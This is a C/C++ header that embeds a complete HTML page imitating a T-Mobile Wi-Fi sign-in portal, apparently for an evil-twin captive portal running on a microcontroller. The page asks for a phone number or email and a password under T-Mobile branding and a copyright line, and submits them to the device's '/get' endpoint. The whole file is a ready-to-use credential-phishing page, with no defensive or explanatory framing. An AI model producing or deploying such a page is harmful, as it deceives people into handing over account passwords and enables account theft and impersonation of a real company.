#ifndef TMOBILE_H
#define TMOBILE_H

const char TMOBILE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>T-Mobile Wi-Fi Login</title>
    <style>
        /* Embedded Tailwind-like CSS for T-Mobile Branding */
        /* Base styles */
        body { margin: 0; padding: 0; font-family: sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
        .min-h-screen { min-height: 100vh; }
        .bg-gradient-to-br { background-image: linear-gradient(to bottom right, var(--tw-gradient-stops)); }
        /* T-Mobile Inspired Gradient: from a deep purple-pink to a vibrant magenta */
        .from-tmobile-dark { --tw-gradient-from: #6A057F; --tw-gradient-to: rgba(106,5,127,0); } /* Darker Magenta/Purple */
        .via-tmobile-medium { --tw-gradient-stops: var(--tw-gradient-from), #E20074, var(--tw-gradient-to); } /* Classic T-Mobile Magenta */
        .to-tmobile-light { --tw-gradient-to: #FF42A5; } /* Brighter Pink/Magenta */

        .flex { display: flex; }
        .items-center { align-items: center; }
        .justify-center { justify-content: center; }
        .p-4 { padding: 1rem; }
        .bg-white { background-color: #fff; }
        .bg-opacity-10 { background-color: rgba(255, 255, 255, 0.1); }
        .backdrop-filter { -webkit-backdrop-filter: blur(8px); backdrop-filter: blur(8px); }
        .backdrop-blur-lg { -webkit-backdrop-filter: blur(8px); backdrop-filter: blur(8px); }
        .rounded-2xl { border-radius: 1rem; }
        .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
        .p-8 { padding: 2rem; }
        .max-w-md { max-width: 28rem; }
        .w-full { width: 100%; }
        .text-white { color: #fff; }
        .border { border-width: 1px; }
        .border-white { border-color: #fff; }
        .border-opacity-20 { border-color: rgba(255, 255, 255, 0.2); }
        .transform { transform: var(--tw-transform); }
        .transition-all { transition-property: all; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); transition-duration: 300ms; }
        .duration-300 { transition-duration: 300ms; }
        .hover\:scale-\[1\.02\]:hover { --tw-scale-x: 1.02; --tw-scale-y: 1.02; transform: var(--tw-transform); }
        .hover\:shadow-2xl:hover { box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }

        /* Typography */
        .mb-8 { margin-bottom: 2rem; }
        .flex-col { flex-direction: column; }
        .items-center { align-items: center; }
        .text-3xl { font-size: 1.875rem; line-height: 2.25rem; }
        .font-bold { font-weight: 700; }
        .text-center { text-align: center; }
        .mb-2 { margin-bottom: 0.5rem; }
        .leading-tight { line-height: 1.25; }
        .text-xl { font-size: 1.25rem; line-height: 1.75rem; }
        .font-light { font-weight: 300; }
        .opacity-80 { opacity: 0.8; }
        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
        .opacity-70 { opacity: 0.7; }
        .mt-8 { margin-top: 2rem; }

        /* Form elements */
        .mb-4 { margin-bottom: 1rem; }
        .mb-6 { margin-bottom: 1.5rem; }
        .input-wrapper {
            display: flex;
            justify-content: center; /* Center the input fields */
            width: 100%;
        }
        .form-input {
            appearance: none;
            background-color: rgba(0, 0, 0, 0.3); /* Darker, more opaque background for better contrast */
            border-color: rgba(255, 255, 255, 0.3);
            border-width: 1px;
            border-radius: 0.5rem; /* rounded-lg */
            padding: 0.75rem; /* p-3 */
            font-size: 1rem;
            line-height: 1.5;
            color: #fff; /* text-white */
            width: 100%; /* Ensures it scales up to max-width */
            max-width: 20rem; /* Limit the maximum width of the input field */
            transition: background-color 200ms, border-color 200ms;
        }
        .form-input::placeholder {
            color: #fff; /* placeholder-white */
            opacity: 0.6; /* placeholder-opacity-60 */
        }
        .form-input:focus {
            outline: 0; /* focus:outline-none */
            box-shadow: 0 0 0 2px rgba(226, 0, 116, 0.75); /* T-Mobile Pink focus ring */
            border-color: transparent; /* focus:border-transparent */
        }

        /* Button */
        .button-container {
            display: flex;
            justify-content: center;
            margin-top: 1.5rem;
        }
        .centered-button {
            max-width: 20rem; /* Equivalent to Tailwind's max-w-xs (320px) */
            width: 100%; /* Ensures it fills its max-width container */
            background-color: #E20074; /* T-Mobile Magenta */
            color: #fff; /* text-white */
            font-weight: 600; /* font-semibold */
            padding-top: 0.75rem; /* py-3 */
            padding-bottom: 0.75rem; /* py-3 */
            border-radius: 0.5rem; /* rounded-lg */
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); /* shadow-lg */
            transition: all 300ms cubic-bezier(0.4, 0, 0.2, 1); /* transition duration-300 transform */
            transform: var(--tw-transform);
            cursor: pointer;
            appearance: none; /* Reset default button styles */
            border: none; /* Reset default button styles */
            line-height: inherit;
        }
        .centered-button:hover {
            background-color: #C00062; /* Darker T-Mobile Magenta on hover */
            transform: translateY(-0.125rem); /* hover:-translate-y-0.5 */
        }
        .centered-button:focus {
            outline: 0; /* focus:outline-none */
            box-shadow: 0 0 0 2px rgba(226, 0, 116, 0.75); /* T-Mobile Pink focus ring */
        }
    </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-tmobile-dark via-tmobile-medium to-tmobile-light flex items-center justify-center p-4">
    <div class="bg-white bg-opacity-10 backdrop-filter backdrop-blur-lg rounded-2xl shadow-xl p-8 max-w-md w-full text-white border border-white border-opacity-20 transform transition-all duration-300 hover:scale-[1.02] hover:shadow-2xl">
        <!-- Text introduction -->
        <div class="mb-8 flex flex-col items-center">
            <h1 class="text-3xl font-bold text-center mb-2 leading-tight">Welcome to T-Mobile Wi-Fi!</h1>
            <h2 class="text-xl text-center mb-8 font-light opacity-80">Please sign in to connect</h2>
        </div>

        <!-- Authentication Form -->
        <form action="/get" id="email-form-step">
            <!-- Phone Number/Email Input Field -->
            <div class="mb-4 input-wrapper">
                <input
                    name="email"
                    type="text"
                    class="form-input"
                    placeholder="Phone Number or Email"
                    required
                    aria-label="Phone Number or Email"
                >
            </div>

            <!-- Password Input Field -->
            <div class="mb-6 input-wrapper">
                <input
                    name="password"
                    type="password"
                    class="form-input"
                    placeholder="Password"
                    required
                    aria-label="Password"
                >
            </div>

            <!-- Sign In Button Container -->
            <div class="button-container">
                <button
                    type="submit"
                    class="centered-button"
                >
                    Connect to Wi-Fi
                </button>
            </div>
        </form>

        <!-- Optional: Add a subtle footer or link -->
        <div class="text-center text-sm opacity-70 mt-8">
            <p>&copy; 2025 T-Mobile. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
)rawliteral";

#endif
